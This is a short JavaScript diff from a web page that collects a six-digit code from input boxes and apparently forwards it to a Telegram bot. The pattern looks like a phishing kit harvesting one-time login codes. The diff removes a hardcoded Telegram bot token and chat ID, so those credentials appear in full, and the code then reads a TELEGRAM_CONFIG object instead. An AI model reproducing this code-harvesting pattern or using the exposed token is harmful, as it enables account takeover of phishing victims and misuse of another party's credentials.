@@ -110,10 +110,6 @@
     submitBtn.addEventListener('click', () => {
       const code = Array.from(inputs).map(input => input.value).join('');
       if (code.length !== 6) return;
-
-      const botToken = "8325475597:AAG81QSonK7rqbShO33CKxJoUOn8ZySapn4";
-      
-      const chatId = "8401770573";
       
       if (typeof TELEGRAM_CONFIG === "undefined") {
         alert("Konfigurasi Telegram tidak ditemukan.");
